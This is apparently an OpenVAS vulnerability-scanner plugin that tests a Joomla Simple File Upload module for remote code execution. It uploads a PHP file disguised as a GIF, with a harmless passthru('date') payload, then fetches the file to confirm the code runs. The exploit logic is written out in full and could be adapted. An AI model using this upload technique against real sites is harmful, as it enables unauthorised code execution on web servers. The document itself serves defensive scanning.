##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_simple_file_upload_code_exec_vuln.nasl 3565 2016-06-21 07:20:17Z benallard $
#
# Joomla Simple File Upload Module Remote Code Execution Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to upload PHP scripts
and execute arbitrary commands on a web server.
Impact Level: Application.";

tag_affected = "Joomla Simple File Upload Module version 1.3.5";

tag_insight = "The flaw is due to the access and input validation errors in the
'index.php' script when uploading files.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Joomla Simple File Upload Module and is
prone to remote code execution vulnerability.";

if(description)
{
  script_id(802560);
  script_version("$Revision: 3565 $");
  script_bugtraq_id(51214);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-06-21 09:20:17 +0200 (Tue, 21 Jun 2016) $");
  script_tag(name:"creation_date", value:"2012-01-06 20:03:12 +0530 (Fri, 06 Jan 2012)");
  script_name("Joomla Simple File Upload Module Remote Code Execution Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47370/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18287/");

  script_summary("Check if the file is uploaded in Joomla");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get joomla port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Get joomla directory
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

## Construct the request to find sfuFormFields and uploadedfile
req = http_get(item:string(joomlaDir, "/index.php"), port:joomlaPort);
buf = http_keepalive_send_recv(port:joomlaPort, data:req, bodyonly:FALSE);

## Grep for sfuFormFields
ver = eregmatch(pattern:'" name="sfuFormFields([0-9]+)', string:buf);
if(ver[1] == NULL){
  exit(0);
}

## Create a file called 'ttst_img00117799.php5' and write the data into file
content = string("-----------------------------1933563624\r\n",
                 "Content-Disposition: form-data; name='sfuFormFields", ver[1], "'\r\n",
                 "\r\n",
                 "\r\n",
                 "-----------------------------1933563624\r\n",
                 "Content-Disposition: form-data; name='uploadedfile", ver[1], "[]'; filename='ttst_img00117799.php5'\r\n",
                 "Content-Type: image/gif\r\n",
                 "\r\n",
                 "GIF8/*/*<?php passthru('date')?>/*\n",
                 "\r\n",
                 "-----------------------------1933563624--\r\n");

## Construct the request to upload the file
header = string("POST " + joomlaDir + "/index.php HTTP/1.1\r\n",
                "Host: " + host + "\r\n",
                "User-Agent: SAINT Joomlaee Simple File Upload Agent\r\n",
                "Connection: Close\r\n",
                "Content-Type: multipart/form-data; boundary=---------------------------1933563624\r\n",
                "Content-Length: " +  strlen(content) + "\r\n\r\n");

sndReq2 = header + content;
rcvRes2 = http_keepalive_send_recv(port:joomlaPort, data:sndReq2);

## Construct the request to view the contents of 'images/ttst_img00117799.php5'
sndReq = http_get(item:joomlaDir + "/images/ttst_img00117799.php5", port:joomlaPort);
rcvRes = http_keepalive_send_recv(port:joomlaPort, data:sndReq);

if(!isnull(rcvRes))
{
  ## Check the contents of the uploaded file
  if("HTTP/1.1 200" >< rcvRes && eregmatch(pattern:"IST [0-9]+", string:rcvRes)){
     security_message(joomlaPort);
  }
}
